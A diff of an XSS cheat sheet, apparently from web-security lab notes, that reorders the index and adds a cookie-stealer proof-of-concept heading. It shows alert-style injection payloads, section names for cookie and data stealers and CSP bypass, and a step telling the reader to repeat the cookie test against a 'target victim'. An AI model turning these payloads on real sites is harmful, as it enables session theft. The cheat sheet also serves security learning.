@@ -2,14 +2,15 @@
 
 ## Index
 - [Walkthrough - Most Important Labs](#walkthrough---most-important-labs)
-- [Generic & POC xss payloads](#generic-payloads-poc)
+- [POC-COOKIE-STEALER](#poc-cookie-stealer)
+- [GENERIC & POC PAYLOADS](#generic-payloads-poc)
 - [COOKIE-STEALER](#cookie-stealer)
 - [DATA-STEALER](#data-stealer)
 - [BYPASS-RESTRICTIONS](#bypass-restrictions)
 - [BYPASS-CPS](#bypass-cps)
 - [SVG-TAGS](#svg-tags)
 - [CUSTOM-TAGS](#custom-tags)
-- [CANONICAL-TAGS](#canonical-tags
+- [CANONICAL-TAGS](#canonical-tags)
 - [FIND TAGS AND EVENTS ALLOWED](#find-tags-and-events-allowed)
 - [ANGULAR JS](#angular-js)
 
@@ -24,8 +25,9 @@
 
 ## CHEATSHEET
 
+#### POC-COOKIE-STEALER
 
-> :test_tube POC of cookie stealer in your browser:
+> 🧪 POC of cookie stealer in your browser: 🧪
 
  In web browser → DevTools → Console add a test cookie
 
@@ -44,7 +46,7 @@ document.cookie = "cookieTest=STEAL-ME-PLS";
 Repeat the same procedure with the target victim
 
 
-####  GENERIC-PAYLOADS-POC
+#### GENERIC-PAYLOADS-POC
 ```js
 <script>alert(1)</script>
 <img src=0 onerror=alert(0)>
@@ -142,5 +144,6 @@ function handleResponse() {
 
 #### ANGULAR-JS
 ```js
+
 
 ```
